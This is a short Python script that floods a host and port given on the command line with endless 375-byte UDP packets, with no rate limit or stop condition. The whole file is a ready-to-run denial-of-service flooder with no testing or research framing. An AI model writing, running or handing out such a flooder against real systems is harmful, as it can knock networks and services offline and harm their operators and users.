import sys
import socket
import datetime

# Defining Variables
host = str(sys.argv[1])
port = int(sys.argv[2])
size = 375

# Sending UDP packets on given IP address
print(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + ": Running........")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.connect((host, port))
        
while True:
    sock.send(b"\x99" * size)